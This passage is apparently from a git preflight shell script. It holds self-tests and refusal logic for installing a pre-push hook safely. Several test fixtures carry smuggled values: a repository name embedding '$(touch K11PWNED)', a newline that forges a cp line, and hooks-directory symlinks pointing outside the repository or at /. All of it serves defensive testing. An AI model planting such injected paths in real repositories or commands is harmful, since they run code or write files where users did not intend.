    *) echo "FAIL: K11/MP11 the cross-repo case produced neither a vouched command nor the ownership refusal (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # Q1 (finding X2) — THE EMITTED COMMAND IS INJECTION-INERT.
  # Double quotes do NOT neutralise `$(…)` or backticks. MEASURED against the T2 tree: a repository root
  # named `pkg$(touch …/PWNED)x` produced a fix line whose paste CREATED the file. This is not exotic
  # input — `git check-ref-format --branch 'x$(id)y'` ACCEPTS the name (measured), so any CI workspace
  # derived from a branch or PR name is attacker-shaped.
  # THE ASSERTION IS THE ABSENCE OF `$(` OUTSIDE SINGLE QUOTES, expressed the only way that is decidable
  # from the outside: the emitted command must contain the SINGLE-QUOTED form of the hostile path. A
  # double-quoted `"…$(touch…)…"` cannot satisfy that pattern, and the fixture's `$(…)` payload is
  # inert-by-construction (it writes only inside the fixture, which is removed either way).
  _q1sfx='pkg$(touch K11PWNED)x'
  d=$(k11_fx incepted none "$_q1sfx") || d=""
  [ -n "$d" ] || { echo "FAIL: K11/Q1 fixture unbuildable (mktemp -d / rename failed) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  _q1pwned=0; [ -e "$d/K11PWNED" ] && _q1pwned=1
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"cp \"$_mpd/hooks/pre-push\""*)
      echo "FAIL: K11/Q1 the install command DOUBLE-quotes an interpolated path — a repo root carrying \$(…) executes on paste (measured: it created the file) ($out)"; fail=1 ;;
    *"cp '$_mpd/hooks/pre-push' '$_mpd/.git/hooks/pre-push'"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/Q1 a repository path containing \$(…) is POSIX-single-quoted in the emitted command — inert on paste, and the run still exits 1"
      else
        echo "FAIL: K11/Q1 the quoted command printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/Q1 a \$(…)-bearing repository path produced neither the double-quoted nor the single-quoted install command (rc=$_mprc) ($out)"; fail=1 ;;
  esac
  # SECOND, INDEPENDENT CLAIM: preflight itself must not have EXECUTED the payload while merely
  # reporting on the path. This one is not about the printed line at all, and no wording change can
  # satisfy it — the file either exists or it does not.
  if [ "$_q1pwned" = 0 ]; then
    echo "PASS: K11/Q1 preflight did not itself execute the \$(…) payload embedded in the repository path"
  else
    echo "FAIL: K11/Q1 preflight EXECUTED a command substitution embedded in the repository's own path while reporting on it"; fail=1
  fi

  # MP12 (found WHILE fixing Y1, by re-running the reviewer's own fixture against the fixed tree) —
  # THE EMITTED COMMAND MUST BE ABSOLUTE EVEN WHEN `.git/hooks` DOES NOT EXIST.
  # This defect is older than the fix-loop, but it was UNREACHABLE until Y1: a repo with a no-op
  # core.hooksPath and no default hooks dir used to take the disclosed skip, so the refusal never ran
  # there. With Y1 fixed it does run — and the absolutizer resolved only the path's PARENT, which is
  # exactly the component that is missing here. MEASURED: the refusal emitted
  # `mkdir -p '.git/hooks' && cp '<abs>/hooks/pre-push' '.git/hooks/pre-push'` — a RELATIVE destination
  # in a paste-able command, i.e. the §4.5 broken-paste defect W3 and MP5 exist for, silently targeting
  # whatever tree the reader happens to be in.
  # A FIX THAT MAKES A NEW PATH REACHABLE MUST BE RE-RUN AGAINST THE FIXTURE THAT REACHES IT — that is
  # the whole finding, and this leg is what stops it regressing.
  d=$(k11_fx incepted hookspath-noop-nodir) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP12 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"mkdir -p '.git/hooks'"*|*"'.git/hooks/pre-push'"*)
      echo "FAIL: K11/MP12 the install command names a RELATIVE .git/hooks — pasted from anywhere but preflight's own cwd it targets the wrong tree (§4.5) ($out)"; fail=1 ;;
    *"mkdir -p '$_mpd/.git/hooks' && cp '$_mpd/hooks/pre-push' '$_mpd/.git/hooks/pre-push'"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP12 a repo whose .git/hooks does not exist still gets a fully ABSOLUTE install command (the deep resolver walks past the missing component)"
      else
        echo "FAIL: K11/MP12 the absolute command printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP12 a repo with a no-op core.hooksPath and no .git/hooks produced neither a relative nor an absolute install command (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # D2 (security re-review, finding M-1) — D1's defence, ONE PATH COMPONENT UP. `[ -h "$GUARD_HOOK" ]`
  # tests the LEAF, so a `.git/hooks` DIRECTORY symlink escapes it entirely and the refusal offered
  # `mkdir -p '<outside>' && cp … && chmod +x …` — the same executable-outside-the-repository outcome D1
  # exists to prevent, reached by a route D1 cannot see. Lives HERE rather than beside D1 because the
  # claim is about the COMMAND the main body emits, and `k11_mp` (the whole-script driver) is not defined
  # until this block; a function-level `k11_run` never reaches the emitted command at all.
  # THE NEGATIVE HALF IS THE LOAD-BEARING ONE, as it is in D1: the escaped directory must appear in NO
  # runnable line. A wording change alone would leave the paste intact, and it is the paste that escapes.
  d=$(k11_fx incepted hooks-dir-symlink) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/D2 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  _d2esc=$( CDPATH='' cd -- "$d-escaped-hooks" 2>/dev/null && pwd -P ) || _d2esc="$_mpd-escaped-hooks"
  # BOTH DRIVERS AGAINST THE ONE FIXTURE. k11_run is the only one that can see GUARD_STATE (it prints
  # the trailer; the whole-script run has no such channel), and k11_mp is the only one that reaches the
  # emitted command. Asserting the state without the command would be D1's mistake repeated — it is the
  # command that escapes.
  outr=$(k11_run "$d") || outr="<k11_run aborted>"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  # BOTH removed: the escape target is a SIBLING of the fixture root, so `rm -rf "$d"` alone would leak
  # it into TMPDIR. Guarded against the unbuildable sentinel the same way every other rm here is.
  rm -rf "$d" 2>/dev/null || true
  case "$d" in /dev/null/*) : ;; *) [ -z "$d" ] || rm -rf "$d-escaped-hooks" 2>/dev/null || true ;; esac
  _mprc=${out##*MP_RC=}
  case "$outr" in
    *"GUARD_REFUSE=1 GUARD_STATE=hooks-escape"*)
      echo "PASS: K11/D2 a .git/hooks directory symlink resolving outside the git dir gets its OWN state (hooks-escape), not 'absent' — the state is what selects the fix line" ;;
    *"GUARD_REFUSE=1 GUARD_STATE=absent"*)
      echo "FAIL: K11/D2 a .git/hooks DIRECTORY SYMLINK was still classified 'absent' — that state selects the cp arm, whose paste writes an executable outside the repository ($outr)"; fail=1 ;;
    *) echo "FAIL: K11/D2 a .git/hooks directory symlink armed neither the hooks-escape state nor the absent misclassification ($outr)"; fail=1 ;;
  esac
  case "$out" in
    *"cp '$_mpd/hooks/pre-push' '$_d2esc/pre-push'"*|*"mkdir -p '$_d2esc'"*|*"chmod +x '$_d2esc/pre-push'"*)
      echo "FAIL: K11/D2 a .git/hooks DIRECTORY SYMLINK got an install command writing an executable to $_d2esc — OUTSIDE the git dir, the exact escape D1 closes one component down ($out)"; fail=1 ;;
    *"HOOKS DIRECTORY"*"NO INSTALL COMMAND IS OFFERED"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/D2 the real run offers NO command for an escaped hooks dir — it names the redirection, points at 'ls -ld' on the LINK, and still exits 1"
      else
        echo "FAIL: K11/D2 the escaped-hooks-dir refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/D2 a .git/hooks directory symlink produced neither the escaping install command nor the no-command refusal (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # MP13 (security re-review, finding LOW-2) — AN INSTALL SOURCE THAT IS NOT A REGULAR FILE MUST NOT BE
  # READ. `guard_is_kit_hook`'s `grep -q` and `guard_sha256`'s hasher both read the source to EOF, and a
  # FIFO with no writer (or a symlink to /dev/zero) has no EOF: MEASURED (2026-07-21) the whole script
  # blocked on `grep -q KIT_GUARD_CORE <fifo>` and never terminated — output stopped after the "no local
  # guard at all" line, rc 142 under a 20 s alarm. Symlinks are tracked git content, so this arrives by
  # PR and stalls any CI job running preflight until the job's own timeout. The destination side has
  # rejected non-regular files since T1 (`[ ! -f "$GUARD_HOOK" ]`); the source side simply never got the
  # same test, which is the partial-application pattern this fix-loop keeps finding.
  # THIS LEG IS ITS OWN LIVENESS PROOF: without the fix it does not fail, it HANGS, so a green selftest
  # trailer at all is part of what it asserts. Its explicit claims are that the run TERMINATES with rc 1,
  # that no `cp` names the non-regular source, and that the refusal says so and names it.
  d=$(k11_fx incepted none-fifo-src) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/MP13 fixture unbuildable (mktemp -d / mkfifo failed) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"cp '$_mpd/hooks/pre-push'"*)
      echo "FAIL: K11/MP13 a NON-REGULAR install source (a FIFO) was offered in a cp line — the paste installs a hook whose content is whatever the writer decides, at paste time ($out)"; fail=1 ;;
    *"NO INSTALL COMMAND IS OFFERED"*"rejected source: $_mpd/hooks/pre-push"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/MP13 a NON-REGULAR install source is rejected WITHOUT being read — the run terminates (it used to block forever on grep/shasum) and still exits 1"
      else
        echo "FAIL: K11/MP13 the non-regular source was rejected but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/MP13 a FIFO install source produced neither a cp line nor the rejection — if this leg never printed at all, the run is BLOCKED on an unbounded read (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # D3 (security re-review, finding MED-1) — D2's ESCAPE, WITH `/` AS THE TARGET. Same shape, same
  # verdict required; the reason it needs its own leg is that `/` is the one target D2's fixture could
  # never reach. guard_resolve_deep ends `printf '%s\n' "${_grd_abs%/}$_grd_tail"`, and for the root the
  # `%/` strips the ONLY character, so the helper printed the EMPTY STRING WITH RC 0 — a fail-open
  # reached through a SUCCESS path, which is why nothing upstream noticed. guard_hooks_dir_escapes's
  # `[ -n "$_ghe_hd" ] || return 1` (its "unresolvable => not an escape" arm) then skipped containment
  # entirely and the refusal emitted `mkdir -p '/' && cp … '/pre-push' && chmod +x '/pre-push'`.
  # THE NEGATIVE HALF IS THE LOAD-BEARING ONE, as in D1/D2: `/` must appear in NO runnable line.
  # WHY THE FIX IS IN THE RESOLVER AND NOT A SECOND TRIGGER — this is the point of the leg, and it is
  # this file's own named failure mode caught eating its own tail. The `[ -h ]` trigger deleted at
  # guard_hooks_dir_escapes WOULD have caught this shape (`.git/hooks -> /` is a leaf symlink), and it
  # was deleted on a MUTATION RESULT: "every escape it caught, containment caught". That measurement was
  # true of the fixture set it was run against — and that set contained no `/`-resolving shape, so the
  # measurement answered a narrower question than the sentence it justified. A fixture that does not
  # carry the attack's essential property tests something else and reports it as the thing you asked
  # for, which is the finding already written above `hooks-dir-symlink`. The trigger is still NOT
  # reinstated: it would re-introduce the cry-wolf it was deleted for (an in-worktree `shared-hooks`
  # link) and would fix ONE shape of a defect the resolver has for every caller — `_g_lnk` and `_g_hdir`
  # in the refusal block go through the same helper. The general defect is the resolver; this leg is
  # what makes the fixture set carry the property the earlier mutation run lacked.
  d=$(k11_fx incepted hooks-dir-root) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/D3 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  outr=$(k11_run "$d") || outr="<k11_run aborted>"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  # The link is unlinked BEFORE the recursive delete. `rm -rf` does not descend into a symlinked
  # directory (measured with a canary tree behind the link), so this is redundant — and it is kept
  # anyway, because the cost of being wrong here is the whole machine's disk.
  rm -f "$d/.git/hooks" 2>/dev/null || true
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$outr" in
    *"GUARD_REFUSE=1 GUARD_STATE=hooks-escape"*)
      echo "PASS: K11/D3 a .git/hooks symlinked to / gets the hooks-escape state — the root is the one target whose resolution used to come back EMPTY with rc 0, i.e. 'not an escape'" ;;
    *"GUARD_REFUSE=1 GUARD_STATE=absent"*)
      echo "FAIL: K11/D3 a .git/hooks symlinked to / was still classified 'absent' — the containment test was skipped through guard_resolve_deep's rc-0 empty return ($outr)"; fail=1 ;;
    *) echo "FAIL: K11/D3 a .git/hooks symlinked to / armed neither the hooks-escape state nor the absent misclassification ($outr)"; fail=1 ;;
  esac
  case "$out" in
    *"mkdir -p '/'"*|*"cp '"*"' '/pre-push'"*|*"chmod +x '/pre-push'"*)
      echo "FAIL: K11/D3 a .git/hooks symlinked to / got an install command writing an executable to /pre-push — the filesystem root, outside every repository there is ($out)"; fail=1 ;;
    *"HOOKS DIRECTORY"*"NO INSTALL COMMAND IS OFFERED"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/D3 the real run offers NO command for a hooks dir that resolves to /, and still exits 1"
      else
        echo "FAIL: K11/D3 the escaped-hooks-dir refusal printed for / but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/D3 a .git/hooks symlinked to / produced neither the escaping install command nor the no-command refusal (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # L2 (security re-review, finding L-2) — A SYMLINKED SOURCE MUST NOT MASK ITS ORIGIN.
  # `source: <top>/hooks/pre-push` reads as the repository's own tracked file. When that path is a
  # symlink, the digest and every inspection the message recommends describe the TARGET — so the facts
  # are true and the PROVENANCE is wrong, which is the harder failure to notice. The operator is being
  # asked to decide whether to make a file executable inside `.git/hooks/`; where that file actually
  # comes from is the decision. NOT a forgery and not scored as one — but a masked origin inside a
  # security verdict is the same family as a rendered excerpt: the reader is given something that looks
  # like evidence and is not what it appears to be.
  d=$(k11_fx incepted none-symlink-src) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/L2 fixture unbuildable (mktemp -d failed — disk full?) — its assertions are void"; fail=1; d=$K11_NOFX; }
  _mpd=$( CDPATH='' cd -- "$d" 2>/dev/null && pwd -P ) || _mpd="$d"
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *"SYMLINK: it points at $_mpd/k11-elsewhere/planted"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/L2 a SYMLINKED install source has its real target printed — the in-tree-looking path no longer masks where the file the digest describes actually comes from"
      else
        echo "FAIL: K11/L2 the symlink target printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *"source:  $_mpd/hooks/pre-push"*)
      echo "FAIL: K11/L2 the refusal named '<top>/hooks/pre-push' and stopped there — that path is a SYMLINK, and the digest plus every inspection it recommends describe a DIFFERENT file ($out)"; fail=1 ;;
    *) echo "FAIL: K11/L2 the symlinked-source case named neither the in-tree path nor its target (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # L2b — RULE 2 ON THE SYMLINK TARGET. L-2's fix prints a path that comes from the FILESYSTEM, which is
  # a new attacker-controlled value entering a security verdict's output; a literal newline in it forges
  # whole lines exactly as it does in the repo path (leg E4). The rejection was written with the fix —
  # and MUTATION-TESTED GREEN, i.e. disabling it changed nothing, because no fixture reached it. That is
  # the "a security fix with no leg is a claim, not a control" case, caught the only way it can be.
  d=$(k11_fx incepted none-symlink-src-nl) || d=""
  [ -n "$d" ] || { echo "FAIL: K11/L2b fixture unbuildable (mktemp -d / newline dir failed) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *K11LNKFORGED*)
      echo "FAIL: K11/L2b a REAL NEWLINE in the install source's SYMLINK TARGET forged a line into the refusal — the L-2 fix opened the surface Rule 2 exists to close ($out)"; fail=1 ;;
    *"SYMLINK whose target contains a CONTROL CHARACTER"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/L2b a symlink target carrying a REAL newline is refused as a control-character path and NEVER printed — the origin is disclosed as unprintable rather than forged, and the run still exits 1"
      else
        echo "FAIL: K11/L2b the hostile-target notice printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/L2b a newline-bearing symlink target produced neither the forged line nor the control-character notice (rc=$_mprc) ($out)"; fail=1 ;;
  esac

  # E4 (finding X3b) — THE REFUSAL-BRANCH FORGERY, end to end. The security review called this the one
  # that fully defeats X1's own mitigation: a LITERAL NEWLINE in the repo root passes straight through
  # `printf '%s\n'` and forged a complete `Fix … cp "/tmp/evil-payload" …` block INSIDE the branch whose
  # entire purpose is to refuse to print one, commenting out the real trailing path with an injected `#`.
  # MEASURED before the fix — and it forged TWICE, at the `hook:` line and again at `rejected source:`.
  # A `printf`-only implementation passes E1 and E2 and fails here; `[[:cntrl:]]` does not match the
  # two-character `\` `n` that E1/E2 use, so neither rule subsumes the other and both need a leg.
  # THE FORGED TEXT CARRIES NO `/`: the payload is a single PATH COMPONENT, and a component containing
  # a slash cannot be created — the first draft used `cp K11FORGED /dev/null #` and `mv` failed with
  # ENOENT, which the unbuildable guard turned into a loud FAIL rather than a vacuous pass. That is the
  # guard working; recorded so the next author does not re-learn it. The claim under test is "a LINE was
  # forged", which needs no working command.
  d=$(k11_fx incepted none-no-src "$(printf 'pkg\n    cp K11FORGED K11DEST #')") || d=""
  [ -n "$d" ] || { echo "FAIL: K11/E4 fixture unbuildable (mktemp -d / rename failed) — its assertions are void"; fail=1; d=$K11_NOFX; }
  out=$(k11_mp "$d") || out="<k11_mp aborted>"
  rm -rf "$d" 2>/dev/null || true
  _mprc=${out##*MP_RC=}
  case "$out" in
    *K11FORGED*)
      echo "FAIL: K11/E4 a REAL NEWLINE in the repository path forged a line into the refusal — the branch that exists to refuse an install command printed one ($out)"; fail=1 ;;
    *"pre-push runtime guard is not in force"*"CONTROL CHARACTER"*)
      if [ "$_mprc" = 1 ]; then
        echo "PASS: K11/E4 a repository path containing a REAL newline is refused WITHOUT the path ever being printed — nothing is forged, and the run still exits 1"
      else
        echo "FAIL: K11/E4 the control-character refusal printed but the run did not exit 1 (rc=$_mprc) ($out)"; fail=1
      fi ;;
    *) echo "FAIL: K11/E4 a newline-bearing repository path produced neither the forged line nor the control-character refusal (rc=$_mprc) ($out)"; fail=1 ;;
  esac
  # E4's ceiling assertion: the hostile-path refusal must ALSO carry the honest ceiling. There is now
  # exactly ONE copy of that paragraph (the state is a `case` arm, not an early exit — see the refusal
  # block), so this and MP1's ceiling assertion die together; both are kept because the arrangement that
  # makes them redundant is itself a design decision a future edit could undo.
  case "$out" in
    *"not a boundary"*"does NOT make main"*"--no-verify"*)
      echo "PASS: K11/E4 the control-character refusal also closes with the honest ceiling (its early exit does not lose the paragraph)" ;;
    *) echo "FAIL: K11/E4 the control-character refusal exits without the honest ceiling — the paragraph is present on one refusal path and missing on another ($out)"; fail=1 ;;
  esac
  fi

  [ "$fail" -eq 0 ] && { echo "OK: preflight selftest"; exit 0; } || { echo "FAIL: preflight selftest"; exit 1; }
fi

echo "Sparkwright — preflight"
echo "Universal prerequisites:"
need jq  "brew install jq | apt-get install jq | dnf install jq"
need git "git-scm.com/downloads"
need sh  "any POSIX shell"
check_git_capability

echo "Recommended (GitHub-based flows — skip on GitLab/ADO):"
recommend gh "GitHub CLI — needed for the branch-protection setup at Inception (cli.github.com)"
if command -v gh >/dev/null 2>&1; then
  # shellcheck disable=SC2034  # rec mirrors miss for recommended tools; warnings don't fail the run
  if gh auth status >/dev/null 2>&1; then echo "  ok   gh auth (logged in)"; else echo "  warn gh auth — run 'gh auth login' before the branch-protection step"; rec=1; fi
fi

if git_env_redirected; then
  echo "" >&2
  echo "ERROR: your git environment redirects git away from this directory." >&2
  # printf '%s\n', not echo — RULE 3 (see the K11 refusal block below), applied to the CLASS rather than
  # to the one instance that was reported. These lines also carry attacker-shaped paths into a security
  # refusal's output, under the same dash-expands-backslash-escapes mechanism, and were written before
  # the rule existed. Not K11's own surface, but the same defect: a rule applied to one of its instances.
  [ -n "${GIT_DIR:-}" ]       && printf '%s\n' "  GIT_DIR=$GIT_DIR" >&2
  [ -n "${GIT_WORK_TREE:-}" ] && printf '%s\n' "  GIT_WORK_TREE=$GIT_WORK_TREE" >&2
  echo "  preflight would report on that repository instead of your product." >&2
  echo "  Nothing has been written. Clear the redirect and re-run:" >&2
  echo "    env -u GIT_DIR -u GIT_WORK_TREE sh scripts/preflight.sh ..." >&2
  exit 1
elif git_dir_outside "$PWD" && [ "${ALLOW_NESTED:-0}" -eq 0 ]; then
  _gcd_raw=$( git rev-parse --git-common-dir 2>/dev/null )
  _gcd_show=$( CDPATH='' cd "${_gcd_raw:-.}" 2>/dev/null && pwd -P )
  [ -n "$_gcd_show" ] || _gcd_show=$_gcd_raw
  echo "" >&2
  echo "ERROR: this directory's git dir lives outside it (nested dir, submodule, or linked worktree)." >&2
  printf '%s\n' "  git dir: $_gcd_show  — the pre-push hook would land in that shared/other repo." >&2   # Rule 3
  echo "  If this is intentional, re-run with:  sh scripts/preflight.sh --allow-nested ..." >&2
  exit 1
fi

# CP-4: refuse before reporting on a repository we do not own. Nested in a foreign worktree,
# every line below would describe the PARENT's repo — a wrong answer stated confidently.
if ! owns_itself "$PWD" && [ "$ALLOW_NESTED" -eq 0 ]; then
  _parent=$(owning_repo_root "$PWD")
  echo "" >&2
  echo "ERROR: this directory is not the root of its own git repository." >&2
  printf '%s\n' "  cwd:      $(pwd -P)" >&2                    # Rule 3
  printf '%s\n' "  owned by: $_parent  (git toplevel)" >&2      # Rule 3
  echo "" >&2
  echo "Everything preflight reports below — remote, repo class, CODEOWNERS, workflows — would" >&2
  echo "describe THAT repository, not your product. Run preflight from the root of its own repo." >&2
  echo "If this nesting is intentional (e.g. a monorepo package), re-run with --allow-nested." >&2
  exit 1
fi

# K11 (CP7R5) — THE CALL SITE. Deliberately DOWNSTREAM of the CP-11 git-dir refusal and the CP-4
# ownership refusal above: we must not pass judgment on a repository we do not own, and both of those
# blocks `exit 1` before reaching here. Upstream of `is_github_repo` because the guard is a property of
# the LOCAL clone — it is equally missing on GitLab, on ADO, and on a repo with no remote at all.
#
# --allow-nested (MEASURED 2026-07-21, not assumed): that flag suppresses BOTH refusals above, so under
# it this check can run in a tree whose git dir belongs to an enclosing repository. It still judges, and
# that is the considered decision, not an oversight — a LINKED WORKTREE trips the CP-11 refusal too
# (measured: rc 1 without the flag, rc 0 with it), so --allow-nested is the ONLY way a real run reaches
# this check from a worktree. Going silent there would leave legs W1/W2/H3 — the whole worktree lane —
# correct and never executed, which is the same defect class this call site exists to close. Residual,
# named rather than absorbed: under --allow-nested the refusal can describe the ENCLOSING repository.
# It is read-only, every path it prints is absolute, and CP-4's own message already states that the
# report describes THAT repository. Locked by leg MP5.
check_guard_installed

if is_github_repo; then
  echo "Adopter environment (GitHub repo detected):"
  check_repo_class
  check_codeowners_placeholders
  check_workflows_valid
fi

if [ -n "$STACK" ]; then
  printf '%s\n' "Stack toolchain ($STACK):"   # Rule 3 — $STACK is raw argv
  if tools=$(stack_tools "$STACK"); then
    # Split "tool|hint" lines with IFS local to `read` (no global IFS mutation), fed via a
    # here-doc — a here-doc is a redirection, not a pipe, so the loop runs in THIS shell and
    # the `miss` accumulator propagates (a `| while` pipe would lose it in a subshell).
    while IFS='|' read -r t hint; do
      [ -n "$t" ] || continue
      need "$t" "$hint"
    done <<EOF
$tools
EOF
  else
    printf '%s\n' "  (no toolchain map for '$STACK' — see profiles/$STACK.md)"   # Rule 3
  fi
  # The stack's DECLARED runtime floor, read from the declaration that already exists. Self-gating:
  # a stack that does not run on node prints nothing here.
  check_runtime_floor "$STACK" "profiles/$STACK/scaffold/.nvmrc"
fi

if [ "$rec" -gt 0 ]; then
  echo ""
  printf '%s\n' "$rec advisory warning(s) above — non-blocking (they do not affect this check's result)."   # Rule 3
fi

if [ "$RUNTIME_REFUSE" -eq 1 ]; then
  echo "" >&2
  echo "ERROR: unsupported runtime — this stack's DECLARED floor is not met." >&2
  # RULES 1 AND 3, APPLIED TO THIS BLOCK AS A CLASS (finding L-3). The security re-review found ONE
  # survivor of the earlier sweep — the `--stack $STACK` line below, an unquoted variable inside a
  # paste-able command, printed with `echo`. It was not alone, and fixing only the reported instance is
  # the pattern that has generated every finding in this slice. So the whole ERROR block moves:
  #   * `printf '%s\n'`, never `echo`, for every line carrying a variable — dash's builtin echo expands
  #     backslash escapes, and dash IS /bin/sh on the ubuntu-latest runner. `$RUNTIME_FOUND` is
  #     `node --version` output (or a seam's) and `$RUNTIME_SRC` is derived from argv.
  #   * `guard_shq` for every variable inside a RUNNABLE line. `$STACK` is raw argv. `$RUNTIME_FLOOR` is
  #     digits-by-construction today (node_major's closing `case` rejects anything else) and is quoted
  #     ANYWAY, deliberately: guard_shq's own note says a helper that is only correct because of a
  #     caller's precondition is the defect class this fix-loop exists to close, and that applies to a
  #     CALL SITE resting on a distant sanitiser just as much. The cost is a cosmetically quoted number
  #     in the fix line; the benefit is that no future change to read_runtime_floor can reopen this.
  printf '%s\n' "  running:  node $RUNTIME_FOUND" >&2
  printf '%s\n' "  required: node >= $RUNTIME_FLOOR   (declared in $RUNTIME_SRC)" >&2
  echo "" >&2
  echo "  Refusing HERE, where it is legible. Below the floor, 'npm ci' refuses (engine-strict) and a" >&2
  echo "  partial install fails deep inside a dependency — CP-7's cold run hit 'node:util.styleText'" >&2
  echo "  inside Rolldown, which reads as anything except a Node version problem." >&2
  echo "" >&2
  printf '%s\n' "  Fix:  nvm install $(guard_shq "$RUNTIME_FLOOR") && nvm use $(guard_shq "$RUNTIME_FLOOR")    (or install Node $RUNTIME_FLOOR from nodejs.org)" >&2
  echo "  If this runtime is deliberate, re-run with the escape and accept that it is unsupported:" >&2
  printf '%s\n' "    sh scripts/preflight.sh --stack $(guard_shq "$STACK") --allow-runtime-mismatch" >&2
  exit 1
fi

# K11 (CP7R5) — THE REFUSAL. Same shape as the RUNTIME_REFUSE block above (legible ERROR, the cause, a
# paste-able fix, exit 1) and placed immediately after it, before the `miss` check, for the same reason
# that block is: these are STATE refusals about the tree, and they are more specific than "a tool is
# missing" — the per-tool `MISS` lines are already printed above, so nothing is hidden by refusing here.
#
# ADDRESSED TO A HUMAN (design §4.5). `.git/` is in the guard's control-plane set, so an agent seat is
# denied the install and a message telling an agent to fix this would be un-actionable by its reader.
#
# DOWNSTREAM INTERACTION WITH incept.sh — MEASURED, not reasoned (finding J9, T2 fix-loop, 2026-07-21).
# scripts/incept.sh runs `sh scripts/preflight.sh` as a HARD precondition (grep `incept: missing
# prerequisites`) BEFORE its own already-incepted refusal (grep `already incepted`). This block therefore
# CHANGES WHICH MESSAGE incept prints when it is re-run in an already-incepted tree whose guard is
# missing. Differential measured on two fixtures identical except for `.git/hooks/pre-push`:
#     guard ABSENT    -> "incept: missing prerequisites. Run 'sh scripts/preflight.sh' ... Aborting."  rc 1
#     guard INSTALLED -> "error: ENGINEERING-PRINCIPLES.md exists — already incepted. Aborting."        rc 1
# NO FAIL-OPEN — both refuse, and this one refuses EARLIER — but the operator is handed the less specific
# of the two reasons, and the pointer it gives (re-run preflight) does print the real cause. Accepted as
# a disclosed cost rather than fixed from here: reordering incept's precondition is incept's decision,
# not this check's, and it is a separate slice. Recorded so the next reader of that message knows this
# block is why it moved.
#
# THE THREE OUTPUT RULES, STATED ONCE AND APPLIED EVERYWHERE IN THIS BLOCK. Every finding this block
# collected in the final fix-loop was a PARTIAL application of a rule already written down here, so the
# rules are numbered, implemented as helpers with one definition each, and cited at each use:
#   1. guard_shq   — POSIX-quote every path that enters a paste-able COMMAND. Double quotes do not
#                    neutralise `$(…)`; a repo named `pkg$(touch …/PWNED)x` executed on paste (measured).
#   2. guard_path_hostile — REJECT control characters before printing, at the top of
#                    check_guard_installed. `printf '%s\n'` stops backslash escapes and nothing else; a
#                    LITERAL newline forged a whole `cp … && chmod +x …` block inside the branch below
#                    whose purpose is to refuse one (measured).
#   3. printf '%s\n', never `echo`, for every line carrying a variable — dash's builtin echo expands
#                    backslash escapes, and dash IS /bin/sh on the ubuntu-latest runner.
# Rules 2 and 3 are BOTH required and neither subsumes the other: `[[:cntrl:]]` does not match the
# two-character sequence `\` `n` (measured in sh/dash/bash), and printf does not stop a real newline.
if [ "$GUARD_REFUSE" -eq 1 ]; then
  # ABSOLUTIZE THE SOURCE TOO. T1 absolutized the DESTINATION ($GUARD_HOOK, locked by leg W3) because
  # `--git-path` answers relative to the cwd — but the source half of this command, `hooks/pre-push`, is
  # repo-root-relative, so pasted from any subdirectory it names a file that is not there. Half an
  # absolute command is still a broken paste, which is the §4.5 defect W3 closed surviving in the other
  # half of the same line. NOT `--path-format=absolute`: that landed in git 2.31 while this script's git
  # floor (:36-37) is WARN-AND-DEGRADE rather than a requirement, so an older git must still get a
